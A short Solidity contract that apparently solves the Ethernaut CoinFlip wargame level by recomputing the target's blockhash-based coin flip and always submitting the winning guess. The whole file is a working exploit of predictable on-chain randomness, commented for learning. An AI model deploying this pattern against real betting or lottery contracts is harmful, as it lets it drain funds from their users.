// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract AttackCoinFlip {
    CoinFlip public victime;
    uint256 public constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) public {
        //we get the instance of CoinFlip in order to attack itgits
        victime = CoinFlip(_coinFlip);
    }

    function flip() public {
        // we just make the three same computation than the CoinFlip contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // now side will be the result of the coin flip so we use it as our guess
        // and call the flip fct of CoinFlip
        victime.flip(side);
    }
}
